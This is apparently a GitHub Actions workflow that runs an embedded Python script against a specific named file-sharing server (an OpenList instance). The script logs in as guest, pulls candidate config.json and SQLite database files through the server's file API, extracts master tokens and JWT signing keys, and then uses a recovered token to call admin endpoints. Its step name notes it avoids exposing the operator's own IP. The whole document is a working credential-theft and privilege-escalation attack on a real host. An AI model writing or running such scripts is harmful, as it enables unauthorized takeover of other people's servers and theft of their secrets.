name: openlist-config-probe
on:
  workflow_dispatch:
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: locate OpenList config.json/master token + data.db for admin + version (zero own-IP)
        run: |
          set +e
          python3 - <<'PY'
          import json, urllib.request, ssl, os, sqlite3, base64, hmac, hashlib, time
          B="https://pan.yazinb.icu"
          ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
          def req(method,path,token=None,body=None):
              h={'User-Agent':'Mozilla/5.0','Accept':'application/json, text/plain, */*'}
              if token: h['Authorization']=token
              data=None
              if body is not None:
                  data=json.dumps(body).encode(); h['Content-Type']='application/json'
              r=urllib.request.Request(B+path,data=data,headers=h,method=method)
              try:
                  resp=urllib.request.urlopen(r,timeout=40,context=ctx); return resp.status, resp.read()
              except urllib.error.HTTPError as e:
                  return e.code, e.read()
          def jget(b):
              try: return json.loads(b)
              except: return {}
          def dget(o,k):
              v=o.get(k)
              return v if isinstance(v,dict) else {}
          s,b=req('POST','/api/auth/login',body={"username":"guest","password":"guest"})
          G=jget(b).get('data',{}).get('token','')
          print("GUEST_LOGIN",s,"tok_len",len(G or ''))
          SUB='Artex  直装包  渗透网站专用'
          def fslist(path,page=1,per=500):
              s,b=req('POST','/api/fs/list',G,{"path":path,"page":page,"per_page":per,"refresh":False})
              return jget(b).get('data',{}).get('content',[])
          def fsget_raw(path):
              s,b=req('POST','/api/fs/get',G,{"path":path})
              return dget(jget(b),'data').get('raw_url','')
          def dl(url,out,timeout=120):
              if not url: return 0
              data=urllib.request.urlopen(url,timeout=timeout,context=ctx).read()
              open(out,'wb').write(data); return len(data)
          # list the data subfolder fully
          print("=== listing /%s/data ===" % SUB)
          for pg in range(1,20):
              items=fslist('/'+SUB+'/data',pg)
              if not items: break
              for x in items:
                  print("  DATA:",x.get('name'),x.get('type'),x.get('size'))
              if len(items)<500: break
          # explicit candidate config/db paths
          cands=[
            '/%s/config.json'%SUB,
            '/%s/data/config.json'%SUB,
            '/%s/data/data.db'%SUB,
            '/%s/data.db'%SUB,
            '/%s/data/openlist.db'%SUB,
            '/%s/data/OpenList.db'%SUB,
            '/%s/data.db'%SUB,
            '/%s/config.json'%SUB,
            '/%s/setting.json'%SUB,
            '/%s/data/setting.json'%SUB,
          ]
          master_token=None; version=None; jwt_key_from_cfg=None
          for c in cands:
              ru=fsget_raw(c)
              print("CAND %s -> raw_url=%s" % (c, ru[:60] if ru else ''))
              if not ru: continue
              out='/tmp/c'+c.replace('/','_')+'.bin'
              n=dl(ru,out)
              print("  downloaded bytes=%s"%n)
              if c.endswith('config.json') or 'config' in c:
                  try:
                      cfg=json.load(open(out))
                      print("  CONFIG KEYS:",list(cfg.keys()))
                      for k,v in cfg.items():
                          kl=str(k).lower()
                          if kl in ('token','mastertoken') and len(str(v))>=12:
                              master_token=str(v); print("    >>> MASTER_TOKEN len=%d : %s"%(len(master_token),master_token[:10]+'...'))
                          if kl=='version': version=str(v); print("    >>> VERSION",version)
                          if kl in ('jwt_key','secret','signingkey'): jwt_key_from_cfg=str(v)[:40]; print("    >>> JWTKEY",jwt_key_from_cfg)
                  except Exception as ex:
                      print("  not json:",repr(ex))
              if c.endswith('.db'):
                  try:
                      con=sqlite3.connect(out)
                      tabs=[r[0] for r in con.execute("select name from sqlite_master where type='table'")]
                      print("  DB TABLES",tabs)
                      for t in tabs:
                          cols=[d[1] for d in con.execute('PRAGMA table_info(%s)'%t)]
                          print("   SCH",t,cols)
                      # settings/master token may be in a settings table
                      for t in tabs:
                          cs=cols
                          lcs=[x.lower() for x in cs]
                          if any(k in x for k in ('token','version')) and any('value' in x or 'key' in x for x in lcs):
                              for row in con.execute('select * from %s'%t):
                                  d=dict(zip(cs,row)); print("    ROW",d)
                                  for kk,vv in d.items():
                                      if 'token' in str(kk).lower() and len(str(vv))>=12: master_token=str(vv); print("      >>> TOKEN",master_token[:10]+'...')
                                      if 'version' in str(kk).lower(): version=str(vv); print("      >>> VERSION",version)
                      con.close()
                  except Exception as ex:
                      print("  not sqlite:",repr(ex))
          print("SUMMARY master_token?",bool(master_token),"version",version)
          # if master token found, use it
          if master_token:
              print("=== ADMIN via master token ===")
              s,b=req('GET','/api/me',master_token)
              print(" /api/me",s,b.decode('utf-8','replace')[:200])
              s,b=req('POST','/api/admin/setting/list',master_token,{})
              print(" SETTING_LIST",s,b.decode('utf-8','replace')[:1200])
          print("DONE")
          PY
          echo "=== WORKFLOW END ==="
